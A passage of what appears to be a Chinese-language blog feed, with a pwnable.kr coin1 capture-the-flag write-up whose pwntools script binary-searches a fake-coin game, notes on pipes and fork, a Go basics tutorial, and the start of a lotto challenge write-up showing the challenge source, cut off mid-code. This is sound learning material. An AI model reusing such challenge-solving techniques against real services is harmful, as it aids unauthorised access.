&lt;h3 id=&quot;cmd1&quot;&gt;&lt;a href=&quot;#cmd1&quot; class=&quot;headerlink&quot; title=&quot;cmd1&quot;&gt;&lt;/a&gt;cmd1&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/view/5876.h</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr input2</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-input2/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-input2/</id>
    <published>2021-01-30T15:55:25.870Z</published>
    <updated>2021-05-03T17:12:20.184Z</updated>
    
    <content type="html"><![CDATA[<h4 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h4><p>从文件描述符指向的管道口读入指定字节的字符串到指定的数组中</p><h4 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h4><p>从指定的数组中写入指定数量的字节到指定的文件描述符指向的管道口</p><p>常见的 三种 0， 1， 2 分别表示标准输入，标准输入，标准错误</p><h4 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h4><h4 id="dup-amp-dup2函数"><a href="#dup-amp-dup2函数" class="headerlink" title="dup&amp;dup2函数"></a>dup&amp;dup2函数</h4><p><img src="pwnable.kr-input2.assets/20170503111155611.jpg"></p><p>复制一份相同的文件描述符</p><h4 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h4><p>在当前父进程创建一个子进程，子进程返回得fpid == 0</p><h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p><img src="pwnable.kr-input2.assets/image-20210124163916045.png"></p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buffer2[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">char</span> buffer[] = <span class="string">&quot;Let&#x27;s study pipe!&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">pid_t</span> fpid;</span><br><span class="line">        pipe(fd);</span><br><span class="line">        fpid = fork();</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d \n&quot;, fd[0], fd[1]);</span></span><br><span class="line">        <span class="keyword">if</span>(fpid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//父进程 向管道中写入数据</span></span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">                write(fd[<span class="number">1</span>], buffer, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;father process input buffer in pipe success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fpid == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//子进程 从管道中读出数据</span></span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">                read(fd[<span class="number">0</span>], buffer2, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;son process output buffer in pipe success!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;the buffer in pipe is %s\n&quot;</span>, buffer2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的作用位父进程将buffer字符串数据写入管道中，子进程从管道中读入数据到新数组buffer2中</p><p>编译输出后</p><p><img src="pwnable.kr-input2.assets/image-20210124180113099.png" alt="image-20210124180113099"></p><h4 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h4><p>三种缓冲</p><p>全缓冲，行缓冲，不缓冲</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;read函数&quot;&gt;&lt;a href=&quot;#read函数&quot; class=&quot;headerlink&quot; title=&quot;read函数&quot;&gt;&lt;/a&gt;read函数&lt;/h4&gt;&lt;p&gt;从文件描述符指向的管道口读入指定字节的字符串到指定的数组中&lt;/p&gt;
&lt;h4 id=&quot;write函数&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>go语言学习1（变量类型与声明方式，循环）</title>
    <link href="http://example.com/2021/01/30/go/GoStudy-1/"/>
    <id>http://example.com/2021/01/30/go/GoStudy-1/</id>
    <published>2021-01-30T14:51:32.538Z</published>
    <updated>2021-05-07T11:23:38.154Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>xxx代表文件的绝对路径</p><ol><li><p>只运行不编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run xxx</span><br></pre></td></tr></table></figure></li><li><p>编译文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build xxx</span><br></pre></td></tr></table></figure></li><li><p>生成工程项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install</span><br></pre></td></tr></table></figure><h3 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h3></li><li><p>go语言中每一个工程项目都需要有一个main包，这个包中的main函数是程序的入口点</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br></pre></td></tr></table></figure></li><li><p>go语言中函数的花括号的前括号不能单独一行</p><p>✔</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>❌</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> </span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>go语言中声明的变量必须使用，否则报错</p></li></ol><p><a href="https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/golang-goroot-gopath-go-modules-%E4%B8%89%E8%80%85%E7%9A%84%E9%97%9C%E4%BF%82%E4%BB%8B%E7%B4%B9-d17481d7a655">GOPATH,GOROOT的关系</a></p><h3 id="变量（常量）的声明和赋值"><a href="#变量（常量）的声明和赋值" class="headerlink" title="变量（常量）的声明和赋值"></a>变量（常量）的声明和赋值</h3><ol><li>标准声明（先声明在赋值）<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> variable_name <span class="keyword">int</span> <span class="comment">//variable_type</span></span><br><span class="line">variable_name = <span class="number">10</span></span><br></pre></td></tr></table></figure></li><li>简化声明，自动推导类型<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable_name := <span class="number">10</span></span><br></pre></td></tr></table></figure></li><li>多重声明<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//相同类型</span></span><br><span class="line"><span class="keyword">var</span> a, b, c <span class="keyword">int</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不同类型先声明后赋值 </span></span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">    a <span class="keyword">int</span></span><br><span class="line">    b <span class="keyword">float32</span></span><br><span class="line">)</span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明时赋值</span></span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">    a <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line">    b <span class="keyword">float32</span> = <span class="number">1.1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简化写法</span></span><br><span class="line"><span class="keyword">var</span> a, b = <span class="number">1</span>, <span class="number">1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自动推导类型</span></span><br><span class="line">a, b, c := <span class="number">1</span>, <span class="number">1.1</span>, <span class="string">&quot;Tom&quot;</span></span><br></pre></td></tr></table></figure><h3 id="匿名变量"><a href="#匿名变量" class="headerlink" title="匿名变量"></a>匿名变量</h3>go语言中存在匿名变量，用下划线表示，多用于接受函数返回值时使用，例子<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">anon_var</span><span class="params">()</span> <span class="params">(a, b, c <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">a, _, c := anon_var()</span><br><span class="line">fmt.Println(a, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>上面代码anon_var函数返回三个值，但是我只想接收第一个和第三个，就是用匿名变量来忽略第二个返回值</li></ol><h3 id="iota枚举"><a href="#iota枚举" class="headerlink" title="iota枚举"></a>iota枚举</h3><p>iota是go语言中的常量计数器，只能作用于常量const，例子如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a1 = <span class="literal">iota</span></span><br><span class="line">a2 = <span class="literal">iota</span></span><br><span class="line">a3 = <span class="literal">iota</span></span><br><span class="line">    )</span><br><span class="line">fmt.Println(a1, a2, a3)</span><br></pre></td></tr></table></figure><p><img src="GoStudy-1.assets/image-20210130232401963.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简化写法</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a1 = <span class="literal">iota</span></span><br><span class="line">a2 </span><br><span class="line">a3 </span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>go语言中循环只有一种方式，for(range算迭代的话)，下面贴使用方法</p><ol><li><p>不加任何条件：无线循环，除非使用break跳出循环</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;fish&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>普通使用方法：与c语言格式类似</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 与while循环格式类似的写法</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        sum := <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> ; sum &lt;= <span class="number">10</span>; &#123;</span><br><span class="line">                sum += sum</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(sum)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这样写也可以，更像 While 语句形式</span></span><br><span class="line">        <span class="keyword">for</span> sum &lt;= <span class="number">10</span>&#123;</span><br><span class="line">                sum += sum</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>与range一起使用</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//i代表下表，data代表数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">&quot;Hello Go&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, data := <span class="keyword">range</span> str &#123;</span><br><span class="line">fmt.Println(i, data)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h3&gt;&lt;p&gt;xxx代表文件的绝对路径&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;只运行不编译&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="go" scheme="http://example.com/categories/go/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr coin1</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-coin1/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-coin1/</id>
    <published>2021-01-30T14:34:13.394Z</published>
    <updated>2021-05-03T17:12:32.672Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="pwnable.kr-coin1.assets/image-20210130223550632.png"></p><p>nc连上去看看</p><p><img src="pwnable.kr-coin1.assets/image-20210130223653659.png"></p><p>一个找假硬币游戏，大概意思为：</p><p>N是硬币个数，C是输入次数，输入相应的硬币下标会给你硬币的重量（图中输入0代表第一个硬币，10是一个真硬币的重量，输入0,1返回20，代表两个真硬币的重量）</p><p>当次数用完时，需要输入假硬币对应的下标，</p><p>整理完过后就是一个题目考察我们的二分查找能力，就是写代码能力，但是这个代码我调试了一会儿。。（太菜了）😔</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>脚本里面用到了正则表达式来提取字符串中的数字，参考了这篇文章（<a href="https://www.codenong.com/10365225/">链接</a>）</p><p>因为链接的端口只开放一分钟，我这儿网速有限，就在pwnable.kr的服务器上去运行代码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MakeFlat</span>(<span class="params">low, high</span>):</span></span><br><span class="line">    Flat = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(low, mid):</span><br><span class="line">        Flat += str(i) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="comment">#log.info(&#x27;[&#x27;+Flat+&#x27;]&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> Flat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinarySearch</span>(<span class="params">n, c</span>):</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = n</span><br><span class="line">    correct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(c):</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        flat = MakeFlat(low, high)</span><br><span class="line">        sh.sendline(flat)</span><br><span class="line">        p = sh.recv()</span><br><span class="line">        <span class="comment">#log.success(p)</span></span><br><span class="line">        <span class="keyword">if</span> int(p) == <span class="number">9</span>:</span><br><span class="line">            correct = flat</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> int(p) &lt; (mid - low) * <span class="number">10</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">elif</span> int(p) == (mid - low) * <span class="number">10</span>:</span><br><span class="line">            low = mid</span><br><span class="line">        correct = str(high - <span class="number">1</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;correct index: &#x27;</span> + correct)</span><br><span class="line">    sh.sendline(correct)</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">N_C</span>():</span></span><br><span class="line">    <span class="comment">#sleep(3)</span></span><br><span class="line">    Flat = sh.recv()</span><br><span class="line">    log.info(Flat)</span><br><span class="line">    ListOfNaC = map(int, re.findall(<span class="string">&#x27;\d+&#x27;</span>, Flat))</span><br><span class="line">    <span class="keyword">return</span> ListOfNaC</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\t- Ready? starting in 3 sec... -\n\t\n&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        _list = N_C()</span><br><span class="line">        BinarySearch(_list[<span class="number">0</span>], _list[<span class="number">1</span>])</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="pwnable.kr-coin1.assets/image-20210130224855930.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;pwnable.kr-coin1.assets/image-20210130223550632.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;nc连上去看看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;pwnable.kr-coin1.asset</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr lotto</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-lotto/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-lotto/</id>
    <published>2021-01-30T14:08:09.028Z</published>
    <updated>2021-05-03T17:12:08.191Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="pwnable.kr-lotto.assets/image-20210130221133246.png"></p><p>利用scp命令从服务器下载源码到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 -r lotto@pwnable.kr: &#x2F;home&#x2F;lotto&#x2F; &#x2F;home&#x2F;fish</span><br></pre></td></tr></table></figure><p>程序源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span 